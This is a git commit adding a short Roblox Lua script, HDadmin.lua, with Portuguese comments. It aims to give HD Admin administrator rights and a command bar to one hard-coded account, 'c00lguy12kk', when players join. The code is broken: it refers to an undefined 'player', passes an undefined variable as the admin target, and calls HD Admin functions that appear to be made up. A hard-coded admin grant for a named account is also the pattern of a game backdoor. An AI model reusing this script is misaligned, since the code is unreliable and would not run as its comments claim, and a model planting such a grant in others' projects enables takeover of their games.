4a918ecae940092f232a5bbc4f2a551db274aea6
sirk12kk <odeiocavalos123@gmail.com>
2024-12-04 16:39:59 -0300

    Create HDadmin.lua

---
+++ HDadmin.lua
@@ -0,0 +1,25 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HDAdmin = require(game:GetService("ServerScriptService"):WaitForChild("HDAdmin"))
+
+-- Nome do jogador a quem você quer conceder privilégios de administrador
+local adminPlayerName = "c00lguy12kk"
+
+-- Função para adicionar administrador
+local function addAdmin(c00lguy12kk)
+    if player.Name == adminPlayerName then
+        -- Adicionar o jogador como administrador usando HD Admin
+        local commands = HDAdmin:GetModule("CommandManager")
+        commands:AddAdmin(c00lguy12kk)
+        print(player.Name .. " foi adicionado como administrador.")
+        
+        -- Iniciar a barra de comandos
+        local startCommandBar = HDAdmin:GetModule("CommandBar")
+        startCommandBar:Initialize(player)
+    end
+end
+
+-- Adicionar administrador quando o jogador entrar no jogo
+Players.PlayerAdded:Connect(function(player)
+    addAdmin(c00lguy12kk)
+end)
